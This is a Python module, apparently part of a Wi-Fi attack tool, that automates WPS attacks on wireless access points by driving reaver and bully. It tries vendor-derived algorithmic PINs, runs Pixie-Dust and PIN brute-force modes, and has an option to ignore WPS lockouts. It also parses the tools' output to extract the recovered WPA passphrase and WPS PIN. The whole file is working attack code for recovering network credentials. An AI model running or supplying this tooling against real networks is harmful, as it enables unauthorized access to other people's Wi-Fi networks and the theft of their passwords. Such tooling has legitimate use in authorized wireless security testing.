"""WPS attacks via reaver/bully."""

from __future__ import annotations

import os
import re
import select
import signal
import subprocess
import time
from typing import Callable, Optional

from ..config import WifluxConfig
from ..models import AccessPoint
from ..process import which
from .interface import recover_interface
from .wps_pin import algorithmic_wps_pins


class WPSAttack:
    @staticmethod
    def run_pixie(
        cfg: WifluxConfig,
        ap: AccessPoint,
        timeout: int,
        on_line: Optional[Callable[[str], None]] = None,
        should_stop: Optional[Callable[[], bool]] = None,
    ) -> tuple[str | None, str | None]:
        if cfg.attack.use_bully and which("bully"):
            return WPSAttack._run_bully(
                cfg, ap, timeout, pixie=True, on_line=on_line, should_stop=should_stop,
            )
        return WPSAttack._run_reaver(
            cfg, ap, timeout, pixie=True, on_line=on_line, should_stop=should_stop,
        )

    @staticmethod
    def run_pin(
        cfg: WifluxConfig,
        ap: AccessPoint,
        timeout: int,
        on_line: Optional[Callable[[str], None]] = None,
        should_stop: Optional[Callable[[], bool]] = None,
    ) -> tuple[str | None, str | None]:
        if cfg.attack.algorithmic_wps and which("reaver"):
            pin, key = WPSAttack._try_algorithmic_pins(
                cfg, ap, timeout, on_line=on_line, should_stop=should_stop,
            )
            if key or (should_stop and should_stop()):
                return pin, key
        if cfg.attack.use_bully and which("bully"):
            return WPSAttack._run_bully(
                cfg, ap, timeout, pixie=False, on_line=on_line, should_stop=should_stop,
            )
        return WPSAttack._run_reaver(
            cfg, ap, timeout, pixie=False, on_line=on_line, should_stop=should_stop,
        )

    @staticmethod
    def _try_algorithmic_pins(
        cfg: WifluxConfig,
        ap: AccessPoint,
        timeout: int,
        *,
        on_line: Optional[Callable[[str], None]] = None,
        should_stop: Optional[Callable[[], bool]] = None,
    ) -> tuple[str | None, str | None]:
        pins = algorithmic_wps_pins(ap.bssid, ap.manufacturer)
        if not pins:
            return None, None
        if on_line:
            on_line(
                f"[cyan]Algorithmic WPS[/]: trying {len(pins)} MAC/vendor-derived PIN(s)",
            )
        per_pin = max(12, min(30, timeout // max(len(pins), 1)))
        iface = recover_interface(cfg.scan.interface, ap.channel, band=ap.radio_band)
        for pin in pins:
            if should_stop and should_stop():
                break
            if on_line:
                on_line(f"[cyan]Algorithmic PIN[/] → {pin}")
            cmd = [
                "reaver", "-i", iface, "-b", ap.bssid, "-c", str(ap.channel),
                "-p", pin, "-f", "-vv",
            ]
            if cfg.attack.wps_ignore_locks:
                cmd.append("-L")
            got_pin, key = WPSAttack._stream_cmd(
                cmd, per_pin, on_line, should_stop,
                pixie=False, ignore_locks=cfg.attack.wps_ignore_locks,
            )
            if key:
                return got_pin or pin, key
        return None, None

    @staticmethod
    def run_reaver_pixie(
        cfg: WifluxConfig,
        ap: AccessPoint,
        timeout: int,
        on_line: Optional[Callable[[str], None]] = None,
        should_stop: Optional[Callable[[], bool]] = None,
    ) -> tuple[str | None, str | None]:
        return WPSAttack.run_pixie(cfg, ap, timeout, on_line=on_line, should_stop=should_stop)

    @staticmethod
    def _run_reaver(
        cfg: WifluxConfig,
        ap: AccessPoint,
        timeout: int,
        *,
        pixie: bool,
        on_line: Optional[Callable[[str], None]] = None,
        should_stop: Optional[Callable[[], bool]] = None,
    ) -> tuple[str | None, str | None]:
        if not which("reaver"):
            return None, None

        iface = recover_interface(
            cfg.scan.interface, ap.channel, band=ap.radio_band,
        )
        cmd = ["reaver", "-i", iface, "-b", ap.bssid, "-c", str(ap.channel), "-f", "-vv"]
        if pixie:
            cmd.append("-K")
            cmd.append("1")
        if cfg.attack.wps_ignore_locks:
            cmd.append("-L")
        return WPSAttack._stream_cmd(
            cmd, timeout, on_line, should_stop,
            pixie=pixie, ignore_locks=cfg.attack.wps_ignore_locks,
        )

    @staticmethod
    def _run_bully(
        cfg: WifluxConfig,
        ap: AccessPoint,
        timeout: int,
        *,
        pixie: bool,
        on_line: Optional[Callable[[str], None]] = None,
        should_stop: Optional[Callable[[], bool]] = None,
    ) -> tuple[str | None, str | None]:
        if not which("bully"):
            return None, None

        iface = recover_interface(
            cfg.scan.interface, ap.channel, band=ap.radio_band,
        )
        cmd = ["bully", "-b", ap.bssid, "-c", str(ap.channel), "-v", "3"]
        if pixie:
            cmd.append("-d")
        if cfg.attack.wps_ignore_locks:
            cmd.append("-F")
        cmd.append(iface)
        return WPSAttack._stream_cmd(
            cmd, timeout, on_line, should_stop,
            pixie=pixie, ignore_locks=cfg.attack.wps_ignore_locks,
        )

    @staticmethod
    def _stream_cmd(
        cmd: list[str],
        timeout: int,
        on_line: Optional[Callable[[str], None]],
        should_stop: Optional[Callable[[], bool]],
        *,
        pixie: bool,
        ignore_locks: bool = False,
    ) -> tuple[str | None, str | None]:
        key = pin = None
        proc: subprocess.Popen[str] | None = None
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                preexec_fn=os.setsid,
            )
            deadline = time.time() + timeout
            last_heartbeat = 0.0
            rx_timeouts = 0
            associated = False
            while proc.poll() is None and time.time() < deadline:
                if should_stop and should_stop():
                    break
                if not proc.stdout:
                    time.sleep(0.5)
                    continue

                ready, _, _ = select.select([proc.stdout], [], [], 1.0)
                if ready:
                    line = proc.stdout.readline()
                    if not line:
                        break
                    line = line.rstrip()
                    if on_line:
                        on_line(line)
                    if "Associated" in line or "AP Setup" in line:
                        associated = True
                    if "Receive timeout" in line or "Timeout" in line:
                        rx_timeouts += 1
                        if pixie and associated and rx_timeouts >= 5:
                            if on_line:
                                on_line("[heartbeat] AP not responding, moving on")
                            break
                    if (
                        not ignore_locks
                        and re.search(r"WPS.*locked|AP.*locked|pin.*locked", line, re.I)
                    ):
                        if on_line:
                            on_line("[heartbeat] WPS locked — stopping")
                        break
                    if m := re.search(r"WPA PSK:\s*'([^']+)'", line):
                        key = m.group(1)
                        break
                    if m := re.search(r"(?:WPS PIN|Pin|PIN).*'([^']+)'", line, re.I):
                        pin = m.group(1)
                    if m := re.search(r"Pin is '([^']+)'", line):
                        pin = m.group(1)
                elif on_line and time.time() - last_heartbeat >= 2.0:
                    label = "Pixie-Dust" if pixie else "WPS PIN"
                    remaining = max(0, int(deadline - time.time()))
                    on_line(f"[heartbeat] {label} running ({remaining}s left)")
                    last_heartbeat = time.time()
        except Exception:
            pass
        finally:
            if proc and proc.poll() is None:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                except ProcessLookupError:
                    proc.kill()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    except ProcessLookupError:
                        proc.kill()
        return pin, key